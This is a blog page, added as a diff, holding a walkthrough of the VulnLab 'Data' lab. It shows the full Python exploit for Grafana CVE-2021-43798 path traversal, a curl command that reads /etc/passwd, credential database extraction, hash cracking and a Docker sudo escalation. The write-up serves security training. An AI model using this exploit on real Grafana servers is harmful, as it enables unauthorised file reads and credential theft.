@@ -1,0 +1,316 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Data | chidori</title><meta name="author" content="Jon Loh"><meta name="copyright" content="Jon Loh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="TLDRData is an easy lab from VulnLabs. Learn to exploit the CVE-2021-23798 on Grafana, analyse database files and abuse excessive Docker privileges to escalate to root from a container to the host mac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Data">
+<meta property="og:url" content="http://example.com/2025/12/31/Data/index.html">
+<meta property="og:site_name" content="chidori">
+<meta property="og:description" content="TLDRData is an easy lab from VulnLabs. Learn to exploit the CVE-2021-23798 on Grafana, analyse database files and abuse excessive Docker privileges to escalate to root from a container to the host mac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Data/data_vl.png">
+<meta property="article:published_time" content="2025-12-31T05:16:55.000Z">
+<meta property="article:modified_time" content="2026-05-25T15:47:49.410Z">
+<meta property="article:author" content="Jon Loh">
+<meta property="article:tag" content="Arbitrary File Read">
+<meta property="article:tag" content="Directory Traversal">
+<meta property="article:tag" content="Docker">
+<meta property="article:tag" content="Grafana">
+<meta property="article:tag" content="Insecure User Permissions">
+<meta property="article:tag" content="Passsword Reuse">
+<meta property="article:tag" content="SSH">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="sqlite3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Data/data_vl.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Data",
+  "url": "http://example.com/2025/12/31/Data/",
+  "image": "http://example.com/images/Data/data_vl.png",
+  "datePublished": "2025-12-31T05:16:55.000Z",
+  "dateModified": "2026-05-25T15:47:49.410Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jon Loh",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/avatar.jpg"><link rel="canonical" href="http://example.com/2025/12/31/Data/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Data',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/VulnLab"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images%5CData%5Cdata_vl.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">chidori</span></a><a class="nav-page-title" href="/"><span class="site-name">Data</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/VulnLab"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Data</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-31T05:16:55.000Z" title="Created 2025-12-31 13:16:55">2025-12-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-05-25T15:47:49.410Z" title="Updated 2026-05-25 23:47:49">2026-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/VulnLab/">VulnLab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h1><p>Data is an easy lab from VulnLabs. Learn to exploit the CVE-2021-23798 on Grafana, analyse database files and abuse excessive Docker privileges to escalate to root from a container to the host machine.</p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">jon@kali:~$ nmap -p- -A data.vl</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 11:25 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> data.vl (10.10.108.123)</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 da:17:e0:9b:7f:24:67:61:a1:f3:83:15:<span class="built_in">df</span> (RSA)</span><br><span class="line">|   256 56:46:39:5d:6c:3f:7f:1f:20:ad (ECDSA)</span><br><span class="line">|   256 5a:d7:00:6f:fe:ac:71:f7:66:c2:60:00:<span class="built_in">df</span>:68:fd:c2 (ED25519)</span><br><span class="line">3000/tcp open  http    Grafana</span><br><span class="line">|_http-robots.txt: 1 disallowed entry </span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">|_http-title: Grafana</span><br><span class="line">|_http-login: Requested resource /login</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4.15</span><br><span class="line">OS details: Linux 4.15</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 53/tcp)</span><br><span class="line">HOP RTT      ADDRESS</span><br><span class="line">1   158.95 ms 10.8.0.1</span><br><span class="line">2   160.16 ms data.vl (10.10.108.123)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 448.51 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li>The target IP address is 10.10.108.123. Ports 22 and 3000 are open.</li>
+</ul>
+<h2 id="SSH-22"><a href="#SSH-22" class="headerlink" title="SSH (22)"></a>SSH (22)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(jon㉿kali)-[~/vulnLab/data]$ ssh jon@data.vl</span><br><span class="line">The authenticity of host <span class="string">&#x27;data.vl (10.10.108.123)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:RalTyqLHjCzX4eqW0S1LHBULmLSuztwmtIUF+jDGFWE.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>data.vl<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">** WARNING: connection is not using a post-quantum key exchange algorithm.</span></span><br><span class="line"><span class="string">** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.</span></span><br><span class="line"><span class="string">** The server may need to be upgraded. See https://openssh.com/pq.html</span></span><br><span class="line"><span class="string">jon@data.vl&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Password authentication is enabled on the target server. If a password is found later, test it for password reuse.</li>
+</ul>
+<h2 id="HTTP-3000"><a href="#HTTP-3000" class="headerlink" title="HTTP (3000)"></a>HTTP (3000)</h2><p><img src="/%5Cimages%5CData%5Cdirsearch.png" alt="HTTP dirsearch"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://data.vl:3000</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Several directories were found with HTTP status codes 200 and 302.</li>
+</ul>
+<h2 id="Website-Features"><a href="#Website-Features" class="headerlink" title="Website Features"></a>Website Features</h2><p><img src="/%5Cimages%5CData%5Cgrafana.png" alt="Grafana Login page"></p>
+<ul>
+<li>Grafana version 8.0 is running on the HTTP server.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Chealthz_directory.png" alt="healthz directory"></p>
+<ul>
+<li>The <code>/healthz</code> directory returns an “Ok” response.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Chealthz_directory.png" alt="metrics directory"></p>
+<ul>
+<li>The <code>/metrics</code> directory returns HTTP server log data.</li>
+</ul>
+<hr>
+<h1 id="Gaining-a-Foothold"><a href="#Gaining-a-Foothold" class="headerlink" title="Gaining a Foothold"></a>Gaining a Foothold</h1><h2 id="CVE-2021-43798-Directory-Traversal-Arbitrary-Read-File"><a href="#CVE-2021-43798-Directory-Traversal-Arbitrary-Read-File" class="headerlink" title="CVE-2021-43798 (Directory Traversal &amp; Arbitrary Read File)"></a>CVE-2021-43798 (Directory Traversal &amp; Arbitrary Read File)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read</span></span><br><span class="line"><span class="comment"># Date: 08/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: s1gh</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://grafana.com/</span></span><br><span class="line"><span class="comment"># Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p</span></span><br><span class="line"><span class="comment"># Version: V8.0.0-beta1 through V8.3.0</span></span><br><span class="line"><span class="comment"># Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-43798</span></span><br><span class="line"><span class="comment"># Tested on: Debian 10</span></span><br><span class="line"><span class="comment"># References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from random import choice</span><br><span class="line"></span><br><span class="line">plugin_list = [</span><br><span class="line">    <span class="string">&quot;alertlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;annolist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;barchart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bargauge&quot;</span>,</span><br><span class="line">    <span class="string">&quot;candlestick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cloudwatch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dashlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gauge&quot;</span>,</span><br><span class="line">    <span class="string">&quot;geomap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gettingstarted&quot;</span>,</span><br><span class="line">    <span class="string">&quot;grafana-azure-monitor-datasource&quot;</span>,</span><br><span class="line">    <span class="string">&quot;graph&quot;</span>,</span><br><span class="line">    <span class="string">&quot;heatmap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;histogram&quot;</span>,</span><br><span class="line">    <span class="string">&quot;influxdb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jaeger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;logs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;loki&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mssql&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">    <span class="string">&quot;news&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nodeGraph&quot;</span>,</span><br><span class="line">    <span class="string">&quot;opentsdb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;piechart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pluginlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;postgres&quot;</span>,</span><br><span class="line">    <span class="string">&quot;prometheus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stackdriver&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;state-timeline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status-histor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;table&quot;</span>,</span><br><span class="line">    <span class="string">&quot;table-old&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tempo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;testdata&quot;</span>,</span><br><span class="line">    <span class="string">&quot;text&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timeseries&quot;</span>,</span><br><span class="line">    <span class="string">&quot;welcome&quot;</span>,</span><br><span class="line">    <span class="string">&quot;zipkin&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def exploit(args):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        file_to_read = input(<span class="string">&#x27;Read file &gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            url = args.host + <span class="string">&#x27;/public/plugins/&#x27;</span> + choice(plugin_list) + <span class="string">&#x27;/../../../../../../../../../../../../..&#x27;</span> + file_to_read</span><br><span class="line">            req = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url, headers=headers)</span><br><span class="line">            prep = req.prepare()</span><br><span class="line">            prep.url = url</span><br><span class="line">            r = s.send(prep, verify=False, <span class="built_in">timeout</span>=3)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Plugin file not found&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-] File not found\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">                    <span class="built_in">print</span>(r.text)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[-] Something went wrong.&#x27;</span>)</span><br><span class="line">                    <span class="built_in">return</span></span><br><span class="line">        except requests.exceptions.ConnectTimeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Request timed out. Please check your host settings.\n&#x27;</span>)</span><br><span class="line">            <span class="built_in">return</span></span><br><span class="line">        except Exception:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-H&#x27;</span>,dest=<span class="string">&#x27;host&#x27;</span>,required=True, <span class="built_in">help</span>=<span class="string">&quot;Target host&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        exploit(args)</span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    sys.exit(0)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>We’ll use <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/50581">this exploit from ExploitDB</a> to read files on the HTTP server. This vulnerability affects versions <strong>v8.0-beta through v8.3.0</strong>.</li>
+</ul>
+<h3 id="Reading-etc-passwd"><a href="#Reading-etc-passwd" class="headerlink" title="Reading /etc/passwd"></a>Reading <code>/etc/passwd</code></h3><p><img src="/%5Cimages%5CData%5Cetc_passwd.png" alt="etc&#x2F;passwd contents"><br><img src="/%5Cimages%5CData%5Cdownload_etc_passwd.png" alt="download etc&#x2F;passwd contents"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python cve-2021-43798.py -H http://data.vl:3000</span><br><span class="line">curl <span class="string">&#x27;http://data.vl:3000/public/plugins/alterlist/../../../../../../../../etc/passwd&#x27;</span> --path-as-is -o passwd</span><br><span class="line"><span class="built_in">cat</span> passwd</span><br></pre></td></tr></table></figure>
+<ul>
+<li>We can read the <code>/etc/passwd</code> file on the HTTP server via <strong>directory traversal</strong>.</li>
+<li>Adding multiple <code>../</code> in the URL in the exploit, we can download the <code>/etc/passwd</code> file on Kali.</li>
+</ul>
+<h3 id="Reading-etc-grafana-grafana-ini"><a href="#Reading-etc-grafana-grafana-ini" class="headerlink" title="Reading /etc/grafana/grafana.ini"></a>Reading <code>/etc/grafana/grafana.ini</code></h3><p><img src="/%5Cimages%5CData%5Cgrafana_ini.png" alt="grafana.ini"></p>
+<ul>
+<li>We found default admin credentials.</li>
+</ul>
+<h3 id="Analysing-var-lib-grafana-grafana-db"><a href="#Analysing-var-lib-grafana-grafana-db" class="headerlink" title="Analysing /var/lib/grafana/grafana.db"></a>Analysing <code>/var/lib/grafana/grafana.db</code></h3><p><img src="/%5Cimages%5CData%5Cgrafana_db.png" alt="grafana_db"></p>
+<ul>
+<li>The <code>/var/lib/grafana/grafana.db</code> file can potentially store usernames and hashed passwords. We’ll save this file for further analysis.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Cdb_interact.png" alt="db_interact"></p>
+<ul>
+<li>Interacting with the database tables, we find user credentials in the user table.</li>
+<li><em>admin</em> is a <strong>privileged</strong> user while <em>boris</em> is a <strong>non-privileged</strong> user.</li>
+</ul>
+<hr>
+<h1 id="Priv-Esc"><a href="#Priv-Esc" class="headerlink" title="Priv Esc"></a>Priv Esc</h1><h2 id="Cracking-Hashes"><a href="#Cracking-Hashes" class="headerlink" title="Cracking Hashes"></a>Cracking Hashes</h2><p><img src="/%5Cimages%5CData%5Chash.png" alt="admin_hash"></p>
+<ul>
+<li>Save the password hashes and their associated salts into a file. 1 password and salt per line.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Cgrafana2hashcat.png" alt="Using grafana2hashcat.py"></p>
+<ul>
+<li>Use <a target="_blank" rel="noopener" href="https://github.com/iamaldi/grafana2hashcat">grafana2hashcat</a> to convert the password hash into a format interpretable by Hashcat and crack it to get the plaintext.</li>
+</ul>
+<h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h1><p><img src="/%5Cimages%5CData%5Cssh_to_target.png" alt="ssh as boris to target"></p>
+<ul>
+<li>SSH into the target server as boris to find the user.txt flag. Password reuse is confirmed here (SSH and SQL database)</li>
+</ul>
+<h2 id="User-Permissions"><a href="#User-Permissions" class="headerlink" title="User Permissions"></a>User Permissions</h2><p><img src="/%5Cimages%5CData%5Cboris_permissions.png" alt="boris permissions"></p>
+<ul>
+<li>We can run the command <code>/snap/bin/docker.exe</code> <strong>as root without any password authentication</strong>. <strong>Any arguments</strong> can be passed to docker.exe.</li>
+</ul>
+<p><img src="/%5Cimages%5CData%5Cetc_passwd2.png" alt="etc&#x2F;passwd contents on target server"></p>
+<ul>
+<li>Reading <code>/cat/passwd</code> in the SSH shell, we get a <strong>different</strong> file as before, this time containing the entry for the <strong>boris</strong> user.</li>
+<li>Knowing that the 1st <code>/etc/passwd</code> file is in a docker container while the 2nd is on the host machine, this means we could access the host machine due to password reuse (SSH and SQL database)</li>
+</ul>
